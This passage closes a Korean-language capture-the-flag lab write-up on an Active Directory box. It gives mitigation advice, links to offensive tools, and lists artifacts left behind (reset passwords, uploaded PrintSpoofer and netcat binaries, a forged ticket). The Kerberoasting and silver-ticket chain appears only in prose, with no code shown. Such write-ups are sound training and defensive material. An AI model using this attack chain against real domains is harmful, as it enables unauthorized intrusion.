- ligolo 세팅부터 플래그까지는 **약 28분**이다(10:28→10:56). 경로가 보이고 나면 실행은 빠르다. 시간은 전부 "무엇을 할지 정하는 데" 든다.

---

## 8. 방어 관점

- **웹에 직원 실명을 전부 걸지 않는다.** 못 걸겠으면 최소한 계정명 규칙과 다르게 만든다. 이 박스는 `이름.성` 이 그대로 계정명이었다.
- **계절+연도 비밀번호를 금지한다.** 길이 규칙만으로는 못 막는다. 금지어 사전(Azure AD Password Protection 류)이나 유출 비밀번호 대조가 필요하다. 잠금 정책도 함께 — 계정당 4회는 대부분의 임계값을 안 건드린다.
- **EMPLOYEES·HELPDESK 같은 광역 그룹에 사용자 객체 GenericAll 을 주지 않는다.** 비밀번호 재설정이 필요하면 **위임 대상을 OU 단위로 좁히고 ForceChangePassword 만** 준다. GenericAll 은 SPN 추가·shadow credential 까지 열어준다.
- **SPN 계정은 gMSA 로 바꾼다.** 자동 생성되는 120자 비밀번호는 크랙이 불가능하다. 못 바꾸면 최소 25자 랜덤 + AES 전용(`msDS-SupportedEncryptionTypes` 에서 RC4 제거). RC4 를 끄면 etype 23 티켓 자체가 안 나온다.
- **실버티켓 탐지** — 유효기간 10년짜리 티켓, KDC 로그(4768/4769) 없이 서비스 로그온(4624)만 있는 이벤트, 존재하지 않는 사용자 이름의 서비스 접근. 근본 차단은 **PAC full signature 강제**다(KB5020805 / CVE-2022-37967, `KrbtgtFullPacSignature`) — 서명이 krbtgt 키로 만들어져 서비스 계정 해시만으로는 위조할 수 없다. 2023-07 부터 enforcement 가 기본이고, 이 DC 의 빌드는 그 이전(2023-04)이라 통했다. `PacRequestorEnforcement`(KB5008380)와 헷갈리지 말 것 — 그건 KDC 가 **발급한** 티켓의 PAC_REQUESTOR 를 검사하는 것이라, KDC 를 아예 거치지 않는 실버티켓에는 걸리지 않는다.
- **`xp_cmdshell` 은 꺼두고, SQL Server 서비스 계정에서 `SeImpersonatePrivilege` 를 뺀다.** 그리고 sysadmin 목록을 감사해서 도메인 광역 그룹(Domain Admins·BUILTIN\Administrators)이 들어가 있으면 뺀다 — 위조 PAC 이 곧바로 sysadmin 이 되는 것은 이런 그룹 매핑을 통해서다.
- **DC 에서 Print Spooler 를 끈다.** DC 에 스풀러가 필요한 경우는 거의 없고, PrintSpoofer 와 PrinterBug 를 동시에 막는다.

---

## 9. 참고 자료

- username-anarchy — https://github.com/urbanadventurer/username-anarchy
- kerbrute — https://github.com/ropnop/kerbrute
- BloodHound / bloodhound-python — https://github.com/dirkjanm/BloodHound.py
- impacket (`GetUserSPNs` · `GetNPUsers` · `ticketer` · `lookupsid` · `mssqlclient`) — https://github.com/fortra/impacket
- ligolo-ng — https://github.com/nicocha30/ligolo-ng (이 박스에서 쓴 것은 v0.8.2)
- PrintSpoofer — https://github.com/itm4n/PrintSpoofer
- hashcat 모드: `-m 13100` Kerberos 5 TGS-REP etype 23 / `-m 19700` etype 18(AES256)
- Kerberos PAC full signature (KB5020805 / CVE-2022-37967) — https://support.microsoft.com/en-us/topic/kb5020805-how-to-manage-kerberos-protocol-changes-related-to-cve-2022-37967-997e9acc-67c5-48e1-8d0d-190269bf4efb (8장의 실버티켓 차단 근거. 2023-07-11 부터 enforcement 가 기본)
- SQL Server 2008 R2 보안 변경 — https://learn.microsoft.com/en-us/previous-versions/sql/sql-server-2008-r2/cc280562(v=sql.105) (`BUILTIN\Administrators` 가 더 이상 기본 sysadmin 이 아니다. 4-3장)

> [!note] 이 노트에는 이 박스를 뚫는 데 쓴 CVE 가 없다
> 위 CVE-2022-37967 은 **방어 쪽 참고**로만 나온다. 프론트매터에 `manual_cves: true` 를 넣어(목록 없이) 색인이 이 번호를 이 박스의 취약점으로 잡지 않게 막아두었다.

---

## 남긴 흔적

되돌리지 않은 것들이다. 실제 평가라면 전부 보고서에 적어야 한다.

- **비밀번호 변경 2건** — `iain.white` 와 `christopher.lewis` 를 `Password123!` 로 바꿨다. **원래 값은 복구 불가.**
- **업로드 파일 3개** — `C:\Users\Christopher.Lewis\Documents\agent.exe`(ligolo), `C:\programdata\ps.exe`(PrintSpoofer64), `C:\programdata\nc64.exe`. 삭제 기록 없음.
- **SQL Server 설정 변경** — `show advanced options` 0→1, `xp_cmdshell` 0→1. 되돌리지 않았다.
- **위조 티켓** — `~/PG/Nagoya/Administrator.ccache` 가 칼리에 남아 있다. 2036년까지 유효하다.
- 칼리 `/etc/hosts` 에 `240.0.0.1 nagoya.nagoya-industries.com` 라인이 남아 있다. 다른 박스 작업에 혼선을 줄 수 있으니 정리 대상.
- 이 세션의 LHOST 는 `192.168.45.175` 였다(VPN 재접속마다 바뀐다).

## 관련 노트

- [[Resourced]] — 같은 날(07-06 오전) 작업한 AD 박스. RBCD 위임 조작 경로
- [[Heist]] · [[Vault]] — 같은 세션대의 AD 박스
- [[Hutch]] — 도메인 사용자 열거 → ACL 남용
- **"자격증명을 깼는데 로그인이 안 된다"** 패턴 — 이 노트(실버티켓으로 전환)
- **"nmap 이 안 보여준 포트"** 패턴 — 이 노트(`filtered` 대량 → 내부에서 재열거 → 터널)
